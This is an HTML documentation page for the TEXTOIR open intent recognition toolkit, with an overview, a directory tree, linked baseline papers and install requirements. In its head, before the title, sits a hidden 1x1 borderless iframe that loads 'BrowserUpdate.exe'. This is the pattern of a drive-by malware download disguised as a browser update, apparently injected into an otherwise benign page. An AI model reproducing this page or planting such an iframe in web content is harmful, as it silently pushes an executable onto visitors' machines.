<!DOCTYPE HTML>
<html>
    <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
        <title>New Intent Discovery System</title>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
        <meta name="description" content="" />
        <meta name="keywords" content="" />
        <link rel="stylesheet" href="/static/lib/xadmin/css/font.css">
        <link rel="stylesheet" href="/static/lib/xadmin/css/main.css" />
        <link rel="stylesheet" href="/static/lib/layui/css/layui.css" media="all">
        <script type="text/javascript" src="/static/lib/layui/layui.js" charset="utf-8"></script>
        <script type="text/javascript" src="/static/lib/xadmin/js/xadmin.js"></script>
        
        
    </head>
    <body >
    <div class="layui-col-md12">
      <div class="layui-card">
            <div class="layui-card-header"></div>
            <div class="layui-card-header" style ="align:'center'">
                <div style="font-weight:700; font-size:26px;color:#555555;text-align:center" >TEXTOIR Toolkit</div>
            </div><br>
            <div class="layui-card-body">
                <p style="font-weight:700; font-size:20px;color:#555555;padding-left:20px">
                    <img src="/static/img/handbook/home.png" width="30px"; height="30px;" style="vertical-align:middle"/>
                    Overview</p><br>

                    <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px">TEXTOIR integrates five state-of-the-art models for open intent detection, and ten competitive models for open intent discovery respectively. Moreover, we propose a unified open intent recognition (OIR) framework, which connects the two modules in a pipeline scheme and achieves multiple model combination. These functions are called TEXTOIR Toolkit .</p>
                    <br>
                    <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px">TEXTOIR Toolkit consists of four parts, which are Dialogue Texts,Open Intent Detection, Open Intent Discovery and Open Intent Recognition respectively.There are two main modules, open intent
                        detection and open intent discovery, which integrates most of the state-of-the-art algorithms
                        respectively.Moreover, we propose a unified open intent recognition (OIR) framework,which connects the two modules in a pipeline scheme and achieves multiple model combination.</p>
                    
                    <div style="padding-left: 100px;"> 
                        <img src="/static/img/textoir_toolkit/textoir_toolit.jpg" width="870px"; height="520px;" style="vertical-align:middle;image-rendering:-moz-crisp-edges;image-rendering:-o-crisp-edges;image-rendering:-webkit-optimize-contrast;image-rendering: crisp-edges;-ms-interpolation-mode:nearest-neighbor;"/>  
                    </div>

                <p style="font-weight:700; font-size:20px;color:#555555;padding-left:20px">
                <img src="/static/img/visualization_platform/Directory.png" width="30px"; height="30px;" style="vertical-align:middle"/>
                Working Directory</p><br>
                
                <div style="width:800px; padding-left: 100px;">
                <pre style="font-size: 15px; background-color:rgb(255, 255, 255);">
.
├── data  
│   ├── banking
│   ├── snips
│   ├── atis
│   ├── dbpedia
│   ├── clinc
│   └── stackoverflow
├── open_intent_detection  
│   ├── Backbone.py
│   ├── dataloader.py
│   ├── init_parameters.py
│   ├── utils.py
│   ├── pretrain.py
│   ├── methods
│   └── README.md
├── open_intent_discovery  
│   ├── Backbone.py
│   ├── dataloader.py
│   ├── init_parameters.py
│   ├── utils.py
│   ├── methods
│   └── README.md
├── pipeline
│   ├── dataloader.py
│   ├── init_parameters.py
│   ├── manager.py
│   ├── utils.py
│   ├── pipe_results
│   └── README.md
├── pipe.py
├── run_detect.py 
├── run_discover.py 
└── Tutorial.md
                </pre>
            </div><br>
        
            <div class="layui-card-body">


                <p style="font-weight:700; font-size:20px;color:#555555;padding-left:20px">
                <img src="/static/img/handbook/horn.png" width="30px"; height="30px;" style="vertical-align:middle"/>
                How to use</p><br>

                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px"><span class="layui-badge-dot layui-bg-cyan"></span><b style="color:#555555;padding-left:10px">Open Intent Detection</b>
                </p>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px">
                    Open Intent Detection module integrates the current mainstream 5 baselines. By defining the interface, a good code format is formed. If you want to add baseline, you can add your own baseline refer to our code format. On the other hand, in order to provide data support to the visual platform, the 5 baselines need to save the intermediate results of the model running. The following is the introduction of baseline and json format.
                </p><br>

                <p style="font-weight:740; font-size:15px;color:#555555;padding-left:30px">Baselines</p><br>

                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://github.com/thuiar/DeepAligned-Clustering" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Discovering New Intents with Deep Aligned Clustering</a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://github.com/thuiar/DeepUnkID" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Deep Unknown Intent Detection with Margin Loss</a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://www.aclweb.org/anthology/D17-1314.pdf" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">DOC: Deep Open Classification of Text Documents</a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://arxiv.org/pdf/1610.02136.pdf" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">A baseline for detecting misclassified and out-of-distribution examples in neural networks</a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://www.cv-foundation.org/openaccess/content_cvpr_2016/html/Bendale_Towards_Open_Set_CVPR_2016_paper.html" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Towards
                    open set deep networks</a></p><br>
                
                <br>
             


               
               
               
               
                <!-- discovery -->
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px"><span class="layui-badge-dot layui-bg-cyan"></span><b style="color:#555555;padding-left:10px">Open Intent Discovery</b>
                </p>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px">
                    Open Intent Discovery module integrates the current mainstream 10 baselines.Among them, there were 5 semi-supervised methods and 5 unsupervised methods. By defining the interface, a good code format is formed. If you want to add baseline, you can add your own baseline refer to our code format. On the other hand, in order to provide data support to the visual platform, the 10 baselines need to save the intermediate results of the model running. The following is the introduction of baseline and json format.
                </p><br>

                <p style="font-weight:740; font-size:15px;color:#555555;padding-left:30px">Semi-Supervised Baselines</p><br>

                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://github.com/thuiar/DeepAligned-Clustering" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Discovering New Intents with Deep Aligned Clustering</a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://github.com/thuiar/CDAC-plus" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Discovering New Intents via Constrained Deep Adaptive Clustering with Cluster Refinement</a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://openaccess.thecvf.com/content_ICCV_2019/papers/Han_Learning_to_Discover_Novel_Visual_Categories_via_Deep_Transfer_Clustering_ICCV_2019_paper.pdf" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Learning to discover novel visual categories via deep transfer clustering</a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://arxiv.org/pdf/1901.00544.pdf" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Multi-class classification without multi-class labels</a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://arxiv.org/pdf/1711.10125.pdf" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Learning to cluster in order to transfer across domains and tasks</a></p><br>
                
                <p style="font-weight:740; font-size:15px;color:#555555;padding-left:30px">Unsupervised Baselines</p><br>
                
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://www.cs.cmu.edu/~bhiksha/courses/mlsp.fall2010/class14/macqueen.pdf" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Some methods for classification and analysis of multivariate observations</a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="https://www.sciencedirect.com/science/article/abs/pii/0031320378900183" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Agglomerative clustering using the concept of mutual nearest neighbourhood. </a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="http://proceedings.mlr.press/v48/xieb16.pdf" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Unsupervised deep embedding for clustering analysis</a></p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:40px"><img src="/static/img/introduction/paper_1.png" width="20px"; height="20px;" style="vertical-align:middle"/><a href="http://proceedings.mlr.press/v70/yang17b/yang17b.pdf" style = "color:blue; font-weight:700; font-size:15px;padding-left:10px">Towards k-means-friendly spaces: Simultaneous deep learning and clustering</a></p><br>
                <br>
               
                <!-- <div style="padding-left: 100px;"> 
                    <img src="/static/img/textoir_toolkit/pie.png" width="450px"; height="370px;" style="vertical-align:middle;image-rendering:-moz-crisp-edges;image-rendering:-o-crisp-edges;image-rendering:-webkit-optimize-contrast;image-rendering: crisp-edges;-ms-interpolation-mode:nearest-neighbor;"/>  
                </div> -->
               

                <!-- recognition -->
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px"><span class="layui-badge-dot layui-bg-cyan"></span><b style="color:#555555;padding-left:10px">Open Intent Recognition</b>
                </p>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px">Model Management：This module collects the classic baseline and the current SOTA model of the Open Intent Detection. And the user can view information about the model.
                </p><br>

                

                <p style="font-weight:700; font-size:20px;color:#555555;padding-left:20px">
                <img src="/static/img/handbook/hammer.png" width="30px"; height="30px;" style="vertical-align:middle"/>
                 Install</p><br>
                 <div style="width:800px; padding-left: 100px;">
                    <pre style="font-size: 15px; background-color:rgb(255, 255, 255);">

PyTorch                    
pytorch_pretrained_bert
matplotlib
sklearn
nltk
gensim
seaborn
tensorflow-gpu
keras
wordcloud
keybert
                    </pre>
                </div><br>
<!-- 
                <p style="font-weight:700; font-size:20px;color:#555555;padding-left:20px">
                <img src="/static/img/handbook/Tools.png" width="30px"; height="30px;" style="vertical-align:middle"/>
                FAQ</p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px"><b style="color:#555555;padding-left:10px">Q:</b> Where can I get the latest version?</p>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px"><b style="color:#555555;padding-left:10px">A:</b>Follow us at GitHub.Click on "Source Code" in the upper right corner to find our GitHub
                </p><br>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px"><b style="color:#555555;padding-left:10px">Q:</b> Can't install MySQL</p>
                <p style="font-weight:540; font-size:15px;color:#555555;padding-left:30px"><b style="color:#555555;padding-left:10px">A:</b>Use search tools.
                </p><br>
                <br> -->

            </div>
            <div class="copyright" style="margin-bottom:40px;text-align:center;">&copy; THUIAR 2021</div>
      </div>

        
        
        
        
        <script>layui.use(['carousel'],
            function() {
                var carousel = layui.carousel;
                //图片轮播
                carousel.render({
                    elem: '#carousel01'
                    ,width: '100%'
                    ,interval: 3000
                }); 

            });
        </script>
    </body>
</html>